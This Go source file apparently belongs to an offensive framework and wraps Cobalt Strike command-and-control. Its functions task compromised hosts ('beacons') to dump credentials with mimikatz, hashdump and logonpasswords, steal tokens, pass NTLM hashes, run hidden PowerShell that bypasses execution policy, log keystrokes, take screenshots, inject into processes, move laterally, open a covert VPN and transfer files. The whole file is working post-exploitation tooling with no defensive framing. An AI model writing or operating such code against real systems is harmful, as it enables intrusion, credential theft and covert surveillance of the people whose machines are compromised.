package cobaltstrike

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/ares/engine/internal/logger"
)

func (e *CobaltStrikeEngine) ListActiveBeacons() (string, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	if len(e.beacons) == 0 {
		return "[*] No active beacons", nil
	}

	var b strings.Builder
	b.WriteString(fmt.Sprintf("%-36s %-15s %-20s %-10s %s\n", "Beacon ID", "Internal IP", "Computer", "Arch", "User"))
	b.WriteString(strings.Repeat("-", 100) + "\n")
	for _, beacon := range e.beacons {
		b.WriteString(fmt.Sprintf("%-36s %-15s %-20s %-10s %s\n",
			beacon.ID, beacon.InternalIP, beacon.Computer, beacon.Arch, beacon.User))
	}
	return b.String(), nil
}

func (e *CobaltStrikeEngine) Interact(beaconID string) (string, error) {
	e.mu.RLock()
	beacon, ok := e.beacons[beaconID]
	e.mu.RUnlock()
	if !ok {
		return "", fmt.Errorf("beacon %s not found", beaconID)
	}
	return fmt.Sprintf("[+] Interacting with beacon %s (%s @ %s)", beaconID, beacon.User, beacon.Computer), nil
}

func (e *CobaltStrikeEngine) ExecuteCommand(beaconID, command string) (string, error) {
	task, err := e.SendTask(beaconID, command)
	if err != nil {
		return "", fmt.Errorf("execute command: %w", err)
	}
	return fmt.Sprintf("[+] Task %s submitted: %s", task.ID, command), nil
}

func (e *CobaltStrikeEngine) UploadFile(beaconID, localPath, remotePath string) (string, error) {
	data, err := os.ReadFile(localPath)
	if err != nil {
		return "", fmt.Errorf("read local file: %w", err)
	}

	cmd := fmt.Sprintf("upload %s %s", localPath, remotePath)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("upload: %w", err)
	}

	meta := map[string]interface{}{
		"task_id":     task.ID,
		"file_size":   len(data),
		"remote_path": remotePath,
		"action":      "upload",
	}
	metaJSON, _ := json.Marshal(meta)
	frame := BuildExternalC2Frame(FrameCommand, metaJSON)
	e.ExternalC2Send(frame)

	result := fmt.Sprintf("[+] Upload task %s: %s (%d bytes) -> %s", task.ID, localPath, len(data), remotePath)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) DownloadFile(beaconID, remotePath, localPath string) (string, error) {
	cmd := fmt.Sprintf("download %s", remotePath)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("download: %w", err)
	}

	result := fmt.Sprintf("[+] Download task %s: %s -> %s", task.ID, remotePath, localPath)
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) ExecuteAssembly(beaconID, assemblyPath string) (string, error) {
	cmd := fmt.Sprintf("execute-assembly %s", assemblyPath)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("execute assembly: %w", err)
	}
	return fmt.Sprintf("[+] .NET assembly execution task %s: %s", task.ID, assemblyPath), nil
}

func (e *CobaltStrikeEngine) RunMimikatz(beaconID, command string) (string, error) {
	cmd := fmt.Sprintf("mimikatz %s", command)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("run mimikatz: %w", err)
	}
	return fmt.Sprintf("[+] Mimikatz task %s: %s", task.ID, command), nil
}

func (e *CobaltStrikeEngine) RunPowerShell(beaconID, command string) (string, error) {
	cmd := fmt.Sprintf("powershell -NoP -NonI -W Hidden -Exec Bypass -C \"%s\"", command)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("run powershell: %w", err)
	}
	return fmt.Sprintf("[+] PowerShell task %s submitted", task.ID), nil
}

func (e *CobaltStrikeEngine) RunExecute(beaconID, exePath string) (string, error) {
	cmd := fmt.Sprintf("execute %s", exePath)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("execute program: %w", err)
	}
	return fmt.Sprintf("[+] Execute task %s: %s", task.ID, exePath), nil
}

func (e *CobaltStrikeEngine) Screenshot(beaconID string) (string, error) {
	task, err := e.SendTask(beaconID, "screenshot")
	if err != nil {
		return "", fmt.Errorf("screenshot: %w", err)
	}
	return fmt.Sprintf("[+] Screenshot task %s submitted", task.ID), nil
}

func (e *CobaltStrikeEngine) Keylogger(beaconID string) (string, error) {
	task, err := e.SendTask(beaconID, "keylogger")
	if err != nil {
		return "", fmt.Errorf("keylogger: %w", err)
	}
	return fmt.Sprintf("[+] Keylogger task %s started on beacon %s", task.ID, beaconID), nil
}

func (e *CobaltStrikeEngine) Portscan(beaconID, target string) (string, error) {
	cmd := fmt.Sprintf("portscan %s", target)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("portscan: %w", err)
	}
	return fmt.Sprintf("[+] Portscan task %s: %s", task.ID, target), nil
}

func (e *CobaltStrikeEngine) Spawn(beaconID, listenerName string) (string, error) {
	cmd := fmt.Sprintf("spawn %s", listenerName)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("spawn: %w", err)
	}
	return fmt.Sprintf("[+] Spawn task %s: new beacon via %s", task.ID, listenerName), nil
}

func (e *CobaltStrikeEngine) Inject(beaconID, listenerName, targetPID string) (string, error) {
	cmd := fmt.Sprintf("inject %s %s", targetPID, listenerName)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("inject: %w", err)
	}
	return fmt.Sprintf("[+] Inject task %s: beacon into PID %s via %s", task.ID, targetPID, listenerName), nil
}

func (e *CobaltStrikeEngine) Link(beaconID, target, listenerName string) (string, error) {
	cmd := fmt.Sprintf("link %s %s", target, listenerName)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("link: %w", err)
	}
	return fmt.Sprintf("[+] Link task %s: peer %s via %s", task.ID, target, listenerName), nil
}

func (e *CobaltStrikeEngine) Unlink(beaconID, target string) (string, error) {
	cmd := fmt.Sprintf("unlink %s", target)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("unlink: %w", err)
	}
	return fmt.Sprintf("[+] Unlink task %s: disconnect %s", task.ID, target), nil
}

func (e *CobaltStrikeEngine) MakeToken(beaconID, user, domain, password string) (string, error) {
	cmd := fmt.Sprintf("make_token %s\\%s %s", domain, user, password)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("make token: %w", err)
	}
	return fmt.Sprintf("[+] Make token task %s: %s\\%s", task.ID, domain, user), nil
}

func (e *CobaltStrikeEngine) StealToken(beaconID, targetPID string) (string, error) {
	cmd := fmt.Sprintf("steal_token %s", targetPID)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("steal token: %w", err)
	}
	return fmt.Sprintf("[+] Steal token task %s: from PID %s", task.ID, targetPID), nil
}

func (e *CobaltStrikeEngine) RevToSelf(beaconID string) (string, error) {
	task, err := e.SendTask(beaconID, "rev2self")
	if err != nil {
		return "", fmt.Errorf("rev2self: %w", err)
	}
	return fmt.Sprintf("[+] RevToSelf task %s: token reverted", task.ID), nil
}

func (e *CobaltStrikeEngine) PTH(beaconID, user, domain, ntlmHash string) (string, error) {
	cmd := fmt.Sprintf("pth %s\\%s %s", domain, user, ntlmHash)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("pth: %w", err)
	}
	return fmt.Sprintf("[+] PTH task %s: %s\\%s", task.ID, domain, user), nil
}

func (e *CobaltStrikeEngine) SSH(beaconID, target, user, password string) (string, error) {
	cmd := fmt.Sprintf("ssh %s@%s %s", user, target, password)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("ssh: %w", err)
	}
	return fmt.Sprintf("[+] SSH task %s: %s@%s", task.ID, user, target), nil
}

func (e *CobaltStrikeEngine) SC(beaconID, target, action string) (string, error) {
	cmd := fmt.Sprintf("sc %s %s", target, action)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("sc: %w", err)
	}
	return fmt.Sprintf("[+] Service control task %s: %s %s", task.ID, target, action), nil
}

func (e *CobaltStrikeEngine) Jumppipe(beaconID, target string) (string, error) {
	cmd := fmt.Sprintf("jump %s pipe", target)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("jumppipe: %w", err)
	}
	return fmt.Sprintf("[+] Jump pipe task %s: %s", task.ID, target), nil
}

func (e *CobaltStrikeEngine) CovertVPN(beaconID, subnet, netmask string) (string, error) {
	cmd := fmt.Sprintf("covertvpn %s %s", subnet, netmask)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("covertvpn: %w", err)
	}
	return fmt.Sprintf("[+] CovertVPN task %s: %s/%s", task.ID, subnet, netmask), nil
}

func (e *CobaltStrikeEngine) BrowserPivot(beaconID, targetPID string) (string, error) {
	cmd := fmt.Sprintf("browserpivot %s", targetPID)
	task, err := e.SendTask(beaconID, cmd)
	if err != nil {
		return "", fmt.Errorf("browserpivot: %w", err)
	}
	return fmt.Sprintf("[+] Browser pivot task %s: PID %s", task.ID, targetPID), nil
}

func (e *CobaltStrikeEngine) Hashdump(beaconID string) (string, error) {
	task, err := e.SendTask(beaconID, "hashdump")
	if err != nil {
		return "", fmt.Errorf("hashdump: %w", err)
	}
	return fmt.Sprintf("[+] Hashdump task %s submitted", task.ID), nil
}

func (e *CobaltStrikeEngine) LogonPasswords(beaconID string) (string, error) {
	task, err := e.SendTask(beaconID, "logonpasswords")
	if err != nil {
		return "", fmt.Errorf("logonpasswords: %w", err)
	}
	return fmt.Sprintf("[+] LogonPasswords task %s submitted", task.ID), nil
}

func (e *CobaltStrikeEngine) addBeaconFromResult(data io.Reader) error {
	var beacon CSBeacon
	if err := json.NewDecoder(data).Decode(&beacon); err != nil {
		return fmt.Errorf("decode beacon: %w", err)
	}
	e.mu.Lock()
	e.beacons[beacon.ID] = &beacon
	e.mu.Unlock()
	logger.Info(fmt.Sprintf("[CobaltStrike] Beacon registered: %s (%s@%s)", beacon.ID, beacon.User, beacon.Computer))
	return nil
}

func (e *CobaltStrikeEngine) updateTaskResult(taskID string, result string) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	task, ok := e.tasks[taskID]
	if !ok {
		return fmt.Errorf("task %s not found", taskID)
	}
	task.Status = "complete"
	task.Result = result
	return nil
}
